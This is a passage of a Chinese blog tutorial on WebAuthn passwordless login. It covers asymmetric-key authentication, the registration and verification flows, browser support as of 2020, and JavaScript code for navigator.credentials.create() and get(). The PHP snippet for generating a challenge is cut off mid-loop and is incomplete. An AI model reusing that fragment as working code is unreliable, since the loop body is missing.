的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 